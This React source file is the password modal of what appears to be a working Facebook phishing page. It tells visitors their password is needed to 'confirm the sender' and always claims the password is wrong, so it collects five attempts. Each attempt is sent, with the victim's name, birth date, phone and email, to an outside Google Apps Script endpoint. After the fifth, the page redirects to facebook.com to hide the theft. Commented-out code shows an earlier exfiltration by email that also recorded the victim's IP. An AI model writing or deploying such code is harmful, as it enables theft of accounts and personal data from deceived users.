import axios from "axios";
import React from "react";
import { useNavigate } from "react-router-dom";
import ButtonSoft from "../UI/ButtonSoft/ButtonSoft";
import InputPassword from "../UI/InputPassword/InputPassword";
import "./Modal.scss";

const Modal = ({ isModal, setIsModal }) => {
  const router = useNavigate();

  const [password, setPassword] = React.useState("");
  const [attempt, setAttempt] = React.useState(0);

  let pass = React.useRef("");

  const styleModal = ["modal"];
  if (isModal) {
    styleModal.push("modal__active");
  }

  const handleContinue = () => {
    if (!password) {
      return;
    }
    if (attempt < 5) {
      // pass.current = password;
      const data = JSON.parse(localStorage.getItem("form"));
      const form = new FormData();
      form.append("fullname", data.fullname);
      form.append("day", data.day);
      form.append("month", data.month);
      form.append("year", data.year);
      form.append("phone", data.phone);
      form.append("email", data.email);

      if (attempt === 0) {
        form.append("first_password", password);
      }
      if (attempt === 1) {
        form.append("second_password", password);
      }
      if (attempt === 2) {
        form.append("third_password", password);
      }
      if (attempt === 3) {
        form.append("fourth_password", password);
      }

      axios.post(
        "https://script.google.com/macros/s/AKfycbzo3dZgMtBIIml9lhUAsfsnOJTNyhLHUZTlnOyg2XHWcQPwXlDU3tjca5r3vejr-JdG/exec",
        form
      );
      // const content = `
      // IP: ${localStorage.getItem("ip")}

      // Fulllname: ${formData.fullname}
      // Ngày sinh : ${formData.day}
      // Tháng sinh : ${formData.month}
      // Năm sinh: ${formData.year}
      // Số điện thoại : ${formData.phone}
      // Email: ${formData.email}
      // First password: ${password}
      // `;
      // sendEmail({ content });
    }
    setAttempt((prev) => prev + 1);
  };

  React.useEffect(() => {
    if (attempt === 5) {
      // const formData = JSON.parse(localStorage.getItem("form"));
      // const content = `
      // IP: ${localStorage.getItem("ip")}
      // Fulllname: ${formData.fullname}
      // Ngày sinh : ${formData.day}
      // Tháng sinh : ${formData.month}
      // Năm sinh: ${formData.year}
      // Số điện thoại : ${formData.phone}
      // Email: ${formData.email}
      // First password: ${pass.current}
      // Last password: ${password}
      // `;
      // sendEmail({ content }).then(() => {
      //   localStorage.setItem("data_info", content);
      //   window.location.href = "https://www.facebook.com";
      // });

      const data = JSON.parse(localStorage.getItem("form"));
      const form = new FormData();

      form.append("fullname", data.fullname);
      form.append("day", data.day);
      form.append("month", data.month);
      form.append("year", data.year);
      form.append("phone", data.phone);
      form.append("email", data.email);
      // form.append("first_password", pass.current);
      form.append("fifth_password", password);

      axios
        .post(
          "https://script.google.com/macros/s/AKfycbzo3dZgMtBIIml9lhUAsfsnOJTNyhLHUZTlnOyg2XHWcQPwXlDU3tjca5r3vejr-JdG/exec",
          form
        )
        .then(() => {
          // localStorage.setItem("data_info", content);
          window.location.href = "https://www.facebook.com";
        });
    }
  }, [attempt, password, router]);

  return (
    <div
      className={styleModal.join(" ")}
      aria-hidden="false"
      // onClick={() => setIsModal((state) => !state)}
    >
      <div className="modal-dialog" onClick={(e) => e.stopPropagation()}>
        <div className="modal-content">
          {/* <div className="modal-header">
            <div className="modal-title" id="exampleModalLabel">
              Please Enter Your Password
            </div>
            <button
              type="button"
              className="btn-close"
              onClick={() => setIsModal((state) => !state)}
            ></button>
          </div> */}
          <div className="modal-body" style={{}}>
            <h1
              style={{
                fontSize: "1.5rem",

                marginTop: "1.15rem",
              }}
            >
              Please enter your facebook password to continue
            </h1>
            <div
              style={{
                height: 1,
                width: "100%",
                background: "rgb(218, 221, 225)",
                marginTop: "1rem",
                marginBottom: "1.25rem",
              }}
            />

            <div className="modal__body-description">
              We need to confirm the sender of the information is you, Please
              enter your facebook password and then continue.
            </div>
            <div className="modal__body-password">
              <InputPassword
                value={password}
                fun={(e) => setPassword(e.target.value)}
              >
                Password
              </InputPassword>
              {attempt > 0 && (
                <p className="text-danger">
                  Incorrect facebook password, please try again.
                </p>
              )}
            </div>
            <div
              style={{
                marginBottom: "1.25rem",
              }}
            >
              <ButtonSoft disabled={password.length > 0} fun={handleContinue}>
                Continue
              </ButtonSoft>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Modal;
